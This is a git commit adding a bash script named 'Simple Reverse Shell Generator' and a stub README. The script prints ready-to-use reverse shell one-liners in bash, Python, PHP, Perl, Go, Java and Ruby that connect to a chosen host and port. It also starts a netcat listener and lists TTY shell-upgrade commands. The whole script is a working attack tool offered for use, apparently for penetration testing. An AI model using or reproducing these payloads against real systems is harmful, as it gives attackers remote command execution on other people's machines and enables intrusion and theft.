e241eaa86375edd8c46ee064e555a7e98b7c1b32
Martin Kubečka <32225978+martinkubecka@users.noreply.github.com>
2021-08-08 20:29:20 +0200

    v0.9
    - rev shell payloads for python, php, java, bash, ruby, perl
    - netcat listener
    - shell upgrade helper

---
+++ README.md
@@ -0,0 +1,3 @@
+# Simple Reverse Shell Generator
+---
+
---
+++ rev_shell_gen.sh
@@ -0,0 +1,173 @@
+#!/usr/bin/env bash
+#Simple Reverse Shell 0.9 : Reverse shell payload generator
+#Author : Martin Kubecka
+
+#Colors
+clear='\033[0m'
+flashing_red_bg_yellow='\e[2;31;43m'
+flashing_red='\e[5;33;40m'
+green='\033[0;32m'
+bg_green='\033[0;42m'
+bold_red='\e[1;31;40m'
+red_bg_gray='\e[1;31;47m'
+
+echo -e "${flashing_red_bg_yellow} --- Simple Reverse Shell Generator --- ${clear}"
+#echo -e "${flashing_red}python :: php :: java :: bash :: ruby :: perl :: netcat${clear}"
+
+usage() {
+cat << EOF
+
+Usage: $0 [-h|l|u] -i param_value -p param_value -t param_value
+
+Simple reverse shell payload generator
+
+Available options:
+
+  -h	Print this help and exit
+  -i	The target address
+  -p	The target port
+  -t	The payload type : bash, python, java, php, perl, ruby, go
+  -l	Start a netcat listener
+  -u	List commands for a shell upgrade
+
+Examples:
+
+  $0 -i 10.0.0.1 -p 4242 -t python
+  $0 -i 10.0.0.1 -p 4242 -t bash -l -u
+
+EOF
+}
+ 
+bash() {
+	printf "\n${green}[+]${clear} ${bg_green}BASH${clear}\n\n"
+	printf "bash -i >& /dev/tcp/$lhost/$lport 0>&1\n\n"
+	printf "0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196\n\n"
+}    
+
+python() {
+	printf "\n${green}[+]${clear} ${bg_green}PYTHON${clear}\n\n"
+	printf "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'\n\n"
+}
+
+php() {
+	printf "\n${green}[+]${clear} ${bg_green}PHP${clear}\n\n"
+	printf "php -r \'\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'\n\n"
+}
+
+perl() {
+	printf "\n${green}[+]${clear} ${bg_green}PERL${clear}\n\n"
+	printf "perl -e \'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n\n"
+	printf ""
+}
+
+go() {
+	printf "\n${green}[+]${clear} ${bg_green}GO${clear}\n\n"
+	printf "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$lhost:$lport\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n\n"
+}
+
+java() {
+	printf "\n${green}[+]${clear} ${bg_green}JAVA${clear}\n\n"
+	printf "Runtime r = Runtime.getRuntime();\n"
+	printf "Process p = r.exec(\"/bin/bash -c \'exec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do \$line 2>&5 >&5; done\'\");\n"
+	printf "p.waitFor();\n\n"
+}
+
+ruby() {
+	printf "\n${green}[+]${clear} ${bg_green}RUBY${clear}\n\n"
+	printf "ruby -rsocket -e\'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'\n\n"
+}
+
+listener() {
+	
+	printf "\n---------------------------------------------\n"
+	# Local listener option
+	# Take user input to set the listening port
+	read -p "Enter a port number for a listener : " listener_port
+	    
+	# Ensure port for listener exists
+	if [ $listener_port -gt 65535 ]
+	then
+	    
+	echo "There are only 65 535 ports to listen on!"
+	    
+	exit
+	    
+	else
+
+    	activate_listener=true
+	fi
+}
+
+upgrade() {
+
+	printf "\n---------------------------------------------\n"
+	# Shell upgrade helper
+	printf "${red_bg_gray}[INFO] SHELL UPGRADE${clear}"
+	printf "\n\n"
+	printf "python -c \'import pty; pty.spawn(\"/bin/bash\")\'\n";
+	printf "background the shell with Ctrl + Z\n";
+	printf "export SHELL=bash\n";
+	printf "stty raw -echo; fg\n";
+	printf "export TERM=xterm-256color\n";
+	printf "stty rows 38 columns 116\n";
+}
+
+# Script logic
+activate_listener=false
+
+while getopts "i:p:t:hlu" arg; do
+
+	case "$arg" in
+
+	 i) lhost=${OPTARG} ;;
+	 p) lport=${OPTARG} ;;
+	 t) type=${OPTARG} ;;
+	 h) usage ;;
+	 l) listener ;;
+	 u) upgrade ;;
+
+	esac
+
+done 
+
+case $type in
+
+  bash | sh)
+    bash
+    ;;
+
+  python | py)
+    python
+    ;;
+    
+  php)
+    php
+    ;;
+    
+  perl)
+    perl
+    ;;    
+
+  go)
+    go
+    ;;
+
+  java)
+    java
+    ;;
+
+  ruby)
+    ruby
+    ;;
+     
+  *)
+    printf "\n\n${bold_red}[!] Invalid payload type option.${clear}\n\n"
+    ;;
+
+esac
+
+if $activate_listener ; then
+
+	nc -lnvp $listener_port
+
+fi
